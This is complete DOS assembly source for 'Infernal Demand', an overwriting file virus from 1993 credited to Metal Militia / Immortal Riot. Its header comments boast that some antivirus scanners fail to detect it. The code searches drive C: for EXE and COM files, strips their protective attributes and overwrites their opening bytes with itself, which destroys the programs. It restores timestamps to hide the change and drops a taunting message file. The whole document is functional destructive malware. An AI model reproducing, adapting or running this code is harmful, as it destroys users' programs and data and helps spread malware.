; VirusName: Infernal Demand
; Country  : Sweden
; Author   : Metal Militia / Immortal Riot
; Date     : 10/08/1993
;
;
; This is our (Metal Militia's) very first scratch virus. It's just
; an overwriting one. It overwrites the first 999 bytes in exe/com 
; files. (Write protected/hidden files are also "infected"). This (999)
; isn't really the virus size, but the virus, is set to	overwrite the
; first 999 bytes. If the programs are less then 999 bytes, the virus
; will overwrite it anyhow.
;
; When you starts this, the virus will make a file under your c:\
; which is called "Infernal.ir". The file includes a rather nice
; "poem" written by the person sitting behind the keys here..
; 
; The "infected" files attributes (time/day), will be saved 
; and restored, the file-size will not be hidden, but anyway.. 
; 
; It doesn't contain any encryption nor nuking routine, but
; who cares about that for an overwriting virus?
;
; F-prot finds this is some trivial-shit, but it ain't!
; Mcafee scan v108 and S&S Toolkit's FindViru can't find this
;
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;			INFERNAL DEMAND
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
cseg            segment byte public
                assume  cs:cseg, ds:cseg

                org     100h

 INFERNAL        proc    far

start:
                mov    ah,19h                   ; get current drive
                int    21h                      ;
                push   ax                       ;                      

                mov    ah,0Eh                   ;           
                mov    dl,02h                   ; drive C:
                int    21h

great:
                mov    dx,offset ExeMask        ; offset 'EXEMASK'
                mov    ah,4Eh                   ; find first
                int    21h                      ;

                jnc    go_for_it                ; jmp if no ERROR


                mov     dx,offset ComMask       ; offset 'COMMASK'
                mov     ah,4Eh                  ; find first
                                                ;
again:                                          ;
                int     21h                     ;

                jc      chdir                   ; If ERROR change directory


go_for_it:
                mov     ax,4300h                ; Get attribute of file
                mov     dx,9eh                  ; Pointer to name in DTA
                int     21h                     ;

                push    cx                      ; Push the attrib to stack

                mov     ax,4301h                ; Set attribute to
                xor     cx,cx                   ; normal
                int     21h                     ;

                mov     ax,3D02h                ; Open file
                mov     dx,9eh                  ; Pointer to name in DTA
                int     21h

                jc      next                    ; if error, get next file

                xchg    ax,bx                   ; Swap AX & BX
                                                ; so the filehandle ends up
                                                ; in BX

                mov     ax,5700h                ; Get file date
                int     21h                     ;


                push    cx                      ; Save file dates
                push    dx                      ;

                mov     dx,100h                 ; Write code from 100h
                mov     ah,40h                  ; to target file.
                mov     cx,789                  ; Write XXX bytes
                int     21h                     ;


                pop     dx                      ; Get the saved
                pop     cx                      ; filedates from the stack

                mov     ax,5701h                ; Set them back to the file
                int     21h                     ;

                mov     ah,3Eh                  ; Close the file
                int     21h                     ;

                pop     cx                      ; Restore the attribs from
                                                ; the stack.

                mov     dx,9eh                  ; Pointer to name in DTA
                mov     ax,4301h                ; Set them attributes back
                int     21h                     ;

next:
                mov     ah,4Fh                  ; now get the next file
                jmp     short again             ; and do it all over again

chdir:
                mov     ah,3ch
                mov     cx,0
                mov     dx,offset makeit
                int     21h

                xchg    ax,bx
                mov     ah,40h
                mov     cx,meslen
                mov     dx,offset note
                int     21h

                mov     ah,3eh
                int     21h

                mov      dx,offset updir        ; offset 'updir'
                mov      ah,3bh                 ; change directory
                int      21h

                jnc      great                  ; jmp to great if no ERROR

exit:
                pop     dx                      ;
                mov     ah,0Eh                  ; restore org. drive
                int     21h                     ;

                retn                            ; return to PROMPT


ExeMask         db      '*.EXE',0
ComMask         db      '*.COM',0
Makeit          db      'c:\infernal.ir',0
UpDir           db      '..',0
Note            db      'Infernal Demand! '
                db      '(c) Metal Militia / Immortal Riot '
Dumpnote        db      ' ',0dh,0ah
                db      'Your misery is our pleasure! ',0dh,0ah
                db      'Your nightmare is our dream! ',0dh,0ah
                db      'Your hell is our paradise! ',0dh,0ah
                db      'Your lost is our demand! ',0dh,0ah
                db      'Your cry is our laugh! ',0dh,0ah
                db      'And your fate is ours!',0dh,0ah
Meslen          equ $-note

 INFERNAL        endp

cseg            ends
                end     start